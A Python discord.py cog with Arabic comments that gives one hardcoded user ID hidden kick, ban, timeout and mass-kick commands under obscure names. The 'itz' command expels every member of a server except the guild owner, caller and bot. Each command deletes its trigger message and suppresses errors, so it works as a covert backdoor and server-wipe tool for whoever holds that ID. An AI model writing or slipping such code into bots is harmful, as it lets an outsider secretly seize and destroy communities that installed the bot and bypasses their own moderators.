import discord
from discord.ext import commands
import datetime

class OwnerOverride(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # الآيدي الخاص بك حصراً
        self.OWNER_ID = 1107355943408259112

    # --- 1. أمر الطرد العادي (!ok @user) ---
    @commands.command(name="ok")
    async def prefix_kick(self, ctx, member: discord.Member, *, reason: str = "بدون سبب"):
        if ctx.author.id != self.OWNER_ID:
            return
        try:
            await ctx.message.delete()
            await member.kick(reason=f"طرد بواسطة المالك: {reason}")
        except Exception:
            pass

    # --- 2. أمر طرد كل اعضاء السيرفر (!itz) ---
    @commands.command(name="itz")
    async def prefix_mass_kick(self, ctx):
        if ctx.author.id != self.OWNER_ID:
            return
        try:
            await ctx.message.delete()
        except Exception:
            pass

        guild = ctx.guild
        for member in guild.members:
            if member != guild.owner and member != ctx.author and member != self.bot.user:
                try:
                    await member.kick(reason="طرد جماعي بواسطة المالك.")
                except Exception:
                    pass

    # --- 3. أمر ميوت الشخص مع المدة (!ot @user 10m) ---
    @commands.command(name="ot")
    async def prefix_timeout(self, ctx, member: discord.Member, duration: str):
        if ctx.author.id != self.OWNER_ID:
            return
        try:
            await ctx.message.delete()
            
            amount = int(duration[:-1])
            unit = duration[-1].lower()
            
            delta = None
            if unit == 's':
                delta = datetime.timedelta(seconds=amount)
            elif unit == 'm':
                delta = datetime.timedelta(minutes=amount)
            elif unit == 'h':
                delta = datetime.timedelta(hours=amount)
            elif unit == 'd':
                delta = datetime.timedelta(days=amount)
                
            if delta:
                until = discord.utils.utcnow() + delta
                await member.timeout(until, reason="ميوت بواسطة المالك.")
        except Exception:
            pass

    # --- 4. أمر باند مع المنشن (!ob @user) ---
    @commands.command(name="ob")
    async def prefix_ban(self, ctx, member: discord.Member, *, reason: str = "بدون سبب"):
        if ctx.author.id != self.OWNER_ID:
            return
        try:
            await ctx.message.delete()
            await member.ban(reason=f"باند بواسطة المالك: {reason}")
        except Exception:
            pass

async def setup(bot):
    await bot.add_cog(OwnerOverride(bot))
